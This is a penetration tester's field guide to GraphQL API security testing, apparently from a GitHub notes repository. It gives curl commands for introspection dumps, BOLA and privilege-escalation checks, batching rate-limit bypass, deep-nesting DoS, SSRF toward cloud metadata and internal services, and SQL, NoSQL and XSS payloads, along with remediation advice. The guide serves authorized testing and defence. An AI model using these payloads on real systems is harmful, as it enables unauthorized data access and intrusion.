# GraphQL API Security — Enterprise Penetration Testing Field Notes

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 5+ Years Enterprise AppSec
>
> **Category:** API Security — GraphQL Attack Surface
>
> **Context:** GraphQL adoption in enterprise applications has accelerated significantly in the last three years. I encounter it primarily in newer microservice architectures, internal developer portals, and headless e-commerce platforms. GraphQL's flexible query model introduces security challenges that REST APIs simply do not have — introspection exposes the complete schema, batching enables rate limit bypass, and the single-endpoint design makes traditional WAF rules less effective. This document covers the GraphQL security testing approach I apply in enterprise engagements.

---

## 🧠 GraphQL vs REST — The Security Differences

```
REST API:
  Many endpoints: /users, /orders, /products, /admin/users
  Each endpoint has a fixed response structure
  Access control per endpoint
  WAF can pattern-match specific URL paths

GraphQL API:
  ONE endpoint: /graphql
  Client specifies exactly what data to fetch
  Response structure varies per query
  Access control must be per-field, per-resolver
  WAF cannot easily inspect query content

Security implications:
  ✓ Surface area looks small (one endpoint)
  ✗ Complexity is dramatically higher (any query combination)
  ✗ Access control failures are harder to detect systematically
  ✗ Introspection gives attacker the complete data model
  ✗ Batching bypasses per-request rate limits
  ✗ Nested queries can cause DoS via deep nesting
```

---

## 🔍 Phase 1 — GraphQL Discovery

```bash
# Common GraphQL endpoint paths
for path in graphql graphql/v1 api/graphql v1/graphql \
            graph gql query api/v1/graphql; do
  code=$(curl -so /dev/null -w "%{http_code}" \
    -X POST "https://app.company.com/$path" \
    -H "Content-Type: application/json" \
    -d '{"query":"{__typename}"}' 2>/dev/null)
  [[ "$code" =~ ^(200|400)$ ]] && echo "FOUND: /$path (HTTP $code)"
done

# GraphQL typically returns 200 for valid queries and 400 for invalid ones
# Even a 400 response with {"errors":[{"message":"..."}]} confirms GraphQL

# Confirm GraphQL endpoint:
curl -s -X POST https://app.company.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __typename }"}' | jq .
# Response: {"data":{"__typename":"Query"}} → confirmed GraphQL
```

---

## 💥 Phase 2 — Introspection Attacks

Introspection is the highest-value initial attack on any GraphQL endpoint.

```bash
# Full schema introspection query — gets everything
INTROSPECTION_QUERY='{"query":"{\n  __schema {\n    queryType { name }\n    mutationType { name }\n    types {\n      name\n      kind\n      description\n      fields {\n        name\n        description\n        type { name kind ofType { name kind } }\n        args { name type { name kind } }\n      }\n      inputFields { name type { name kind } }\n    }\n  }\n}"}'

curl -s -X POST https://app.company.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d "$INTROSPECTION_QUERY" | jq . > schema_dump.json

# Extract all type names (the data model):
cat schema_dump.json | jq -r '.data.__schema.types[].name' | \
  grep -v "^__" | sort

# Extract all query fields (what you can read):
cat schema_dump.json | jq -r '.data.__schema.types[] |
  select(.name == "Query") |
  .fields[].name'

# Extract all mutation fields (what you can change/create/delete):
cat schema_dump.json | jq -r '.data.__schema.types[] |
  select(.name == "Mutation") |
  .fields[].name'

# What introspection reveals in enterprise apps:
# Queries: getUser, getAllUsers, getEmployee, getPayroll, adminGetAll
#   → "admin" prefix = admin-only queries → test with standard token
# Mutations: updateUser, deleteUser, promoteToAdmin, createAPIKey
#   → test each without admin role

# Burp Extension: InQL
# Import the introspection response → visual schema browser
# Generates test queries for every field automatically
```

---

## 💥 Phase 3 — Authorization Testing

### Testing Field-Level Access Control

```bash
# After introspection reveals the schema, test each query with standard user token

# Test 1: Admin-level query with standard user token
curl -s -X POST https://app.company.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer STANDARD_USER_TOKEN" \
  -d '{"query": "{ getAllUsers { id email salary role } }"}' | jq .
# Expected: 403 Forbidden or empty data
# Finding if: Full user list with salary data returned

# Test 2: Access another user's sensitive data
curl -s -X POST https://app.company.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer ACCOUNT_A_TOKEN" \
  -d '{"query": "{ user(id: 1042) { email salary bankAccount nationalId } }"}' | jq .
# Expected: Only own data
# Finding if: Another user's data returned = GraphQL BOLA

# Test 3: Mutations without authorisation
curl -s -X POST https://app.company.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer STANDARD_USER_TOKEN" \
  -d '{"query": "mutation { promoteUser(userId: 1099, role: \"admin\") { success } }"}' | jq .
# Finding if: {"data":{"promoteUser":{"success":true}}} = privilege escalation

# Test 4: Field-level IDOR in nested objects
curl -s -X POST https://app.company.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query": "{ order(id: 8823) { id total user { email salary } } }"}' | jq .
# Test: does nested user object respect access control?
# Finding: order belongs to user 1042, but querying user.salary via order = BOLA chain
```

---

## 💥 Phase 4 — GraphQL-Specific Attack Vectors

### Attack 1 — Batching (Rate Limit Bypass)

```bash
# GraphQL allows multiple operations in a single HTTP request
# Rate limiting is typically per-request — batching bypasses it

# Batch 100 user lookups in ONE HTTP request:
python3 << 'PYEOF'
import json

queries = []
for i in range(1001, 1101):
    queries.append({
        "query": f"{{ user(id: {i}) {{ id email salary }} }}"
    })

print(json.dumps(queries))
PYEOF

# Send the batched request:
curl -s -X POST https://app.company.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '[{"query":"{ user(id:1001) { email salary } }"},
       {"query":"{ user(id:1002) { email salary } }"},
       ...
       {"query":"{ user(id:1100) { email salary } }"}]' | jq length
# If 100 user records returned in one request = batching enables mass data enumeration
# Rate limiting of 10 req/min is bypassed because it was 1 HTTP request
```

### Attack 2 — Deep Nesting (DoS via Complexity)

```bash
# Deeply nested queries force the server to resolve many levels recursively
# This can cause exponential processing time and memory consumption

# Safe PoC — measure response time, do not cause actual DoS:
time curl -s -X POST https://app.company.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query":"{ user(id:1) { orders { items { product { category { products { category { products { name } } } } } } } } }"}' > /dev/null

# Note: this type of deeply nested query (10+ levels) should be rejected
# If response takes >5 seconds or causes timeout = no query depth limit
# Finding: Missing query depth limit / complexity analysis
# Report without actually causing service disruption
```

### Attack 3 — Introspection in Production (Information Disclosure)

```bash
# Introspection should be DISABLED in production environments
# If enabled, the complete data model is exposed to any unauthenticated attacker

# Test unauthenticated introspection (most impactful variant):
curl -s -X POST https://app.company.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}' | jq .

# If schema returned without Authorization header:
# Finding: Unauthenticated GraphQL introspection = Critical information disclosure
# Attacker gets complete data model, all field names, all mutation names
# → Directly enables targeted BOLA, privilege escalation testing

# Enterprise impact:
# Type names like "EmployeePayroll", "AdminConfig", "InternalAPIKey"
# Field names like "salary", "nationalId", "plainTextPassword", "adminSecret"
# These reveal the data the application stores and provides immediate test targets
```

### Attack 4 — SSRF via GraphQL Mutations

```bash
# If any mutation accepts a URL argument (webhooks, image import, link preview):
curl -s -X POST https://app.company.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query": "mutation { createWebhook(url: \"http://169.254.169.254/latest/meta-data/\") { id } }"}' | jq .
# If webhook content or error reveals metadata = SSRF via GraphQL

# Also test:
# fetchExternalResource(url: "http://127.0.0.1:6379/")  → internal Redis
# importFromUrl(source: "http://10.0.0.1:8080/")        → internal service
```

### Attack 5 — Injection in GraphQL Arguments

```bash
# SQL Injection in GraphQL arguments (if resolver uses raw SQL):
curl -s -X POST https://app.company.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query": "{ users(filter: \"1 OR 1=1\") { id email } }"}' | jq .
# If all users returned = SQL injection in filter argument

# NoSQL Injection (MongoDB):
curl -s -X POST https://app.company.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query": "{ user(id: \"$where: function(){return true}\") { email } }"}' | jq .

# XSS via stored field (if data rendered in browser):
curl -s -X POST https://app.company.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query": "mutation { updateProfile(name: \"<script>alert(1)</script>\") { name } }"}' | jq .
```

---

## 🗂️ Systematic GraphQL Testing Checklist

```
DISCOVERY
☐ Find GraphQL endpoint (common paths + 400 error = confirmed)
☐ Test introspection with and without authentication
☐ Download full schema if introspection enabled
☐ Import schema to Burp InQL or Postman for organised testing

AUTHENTICATION
☐ Test all queries/mutations without Authorization header
☐ Test with standard user token against admin-prefixed operations

AUTHORISATION (per query and mutation)
☐ Test every query with another user's ID argument → BOLA
☐ Test admin queries with standard user token → privilege escalation
☐ Test mutations: delete, update, promote with wrong user → IDOR
☐ Test nested objects for field-level access control bypass

GRAPHQL-SPECIFIC
☐ Batching: send 50 queries in one request → rate limit bypass
☐ Deep nesting: 10-level nested query → measure response time
☐ Alias flooding: 100 aliases for same query = amplification
☐ Directive abuse: @include, @skip manipulation

INJECTION
☐ SQL injection in filter/search arguments
☐ NoSQL injection in ID arguments
☐ XSS in stored string field mutations
☐ SSRF in URL-accepting mutations (webhook, import)
```

---

## 📋 Enterprise Report Template

**Finding Title:** GraphQL Introspection Enabled Without Authentication — Complete Schema Exposed

**Severity:** High | **CVSS v3.1:** 7.5

```
Request (no auth header):
POST /graphql HTTP/1.1
Host: api.company.com
Content-Type: application/json

{"query": "{ __schema { types { name fields { name } } } }"}

Response: HTTP 200 OK
{
  "data": {
    "__schema": {
      "types": [
        {"name": "EmployeePayroll", "fields": [
          {"name": "salary"}, {"name": "bankAccount"},
          {"name": "nationalId"}, {"name": "taxId"}
        ]},
        {"name": "AdminConfig", "fields": [
          {"name": "jwtSecret"}, {"name": "dbPassword"},
          {"name": "awsAccessKey"}
        ]},
        {"name": "Mutation", "fields": [
          {"name": "promoteUserToAdmin"},
          {"name": "deleteAllUsers"},
          {"name": "generateMasterApiKey"}
        ]}
      ]
    }
  }
}

Impact:
  Complete data model exposed to unauthenticated attackers.
  Field names directly reveal sensitive data types (salary, bankAccount, jwtSecret).
  Admin mutations identified for targeted privilege escalation testing.
  This finding accelerated discovery of subsequent Critical BOLA and
  privilege escalation findings documented separately.

Remediation:
  Disable introspection in production:
  # Apollo Server:
  new ApolloServer({ introspection: false })
  
  # Spring GraphQL:
  spring.graphql.schema.introspection.enabled=false
  
  If introspection is needed for development tooling:
  → Restrict to authenticated requests with admin role only
  → Never enable in production without authentication gate
```

---

## 🧭 Key Takeaways

**1. Introspection enabled in production is always a reportable finding.**
The complete API schema — every type, every field, every mutation — should never be exposed to unauthenticated requests in production. It is a one-query blueprint for every subsequent attack. Disable it unconditionally, or gate it behind admin authentication.

**2. GraphQL access control must be implemented at the resolver level — not at the route level.**
REST APIs can control access at the URL route level. GraphQL has one URL. Every field, every nested object, every mutation needs its own access control check in the resolver function. This is architecturally complex, and enterprise teams miss it regularly.

**3. Batching is the most underappreciated GraphQL security risk.**
An API might have rate limiting of 10 requests per second. A single batched GraphQL request containing 100 queries counts as 1 request while executing 100 database lookups. This enables mass data enumeration and DoS that completely bypasses rate limiting. Always test batching.

**4. Test nested objects for access control bypass — it is consistently missed.**
An order object (which you own) has a user object field (which might be someone else's). If the order resolver checks ownership but the nested user resolver does not — you can access any user's data by querying it through your own order. This graph traversal bypass is unique to GraphQL.

---

## 🔗 References
- [OWASP GraphQL Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [PortSwigger GraphQL API Vulnerabilities](https://portswigger.net/web-security/graphql)
- [InQL Burp Extension](https://github.com/doyensec/inql)
- [GraphQL Security Audit](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection)

---
<div align="center">

*Part of [AppSec From The Trenches](../README.md) — Real notes from 5+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
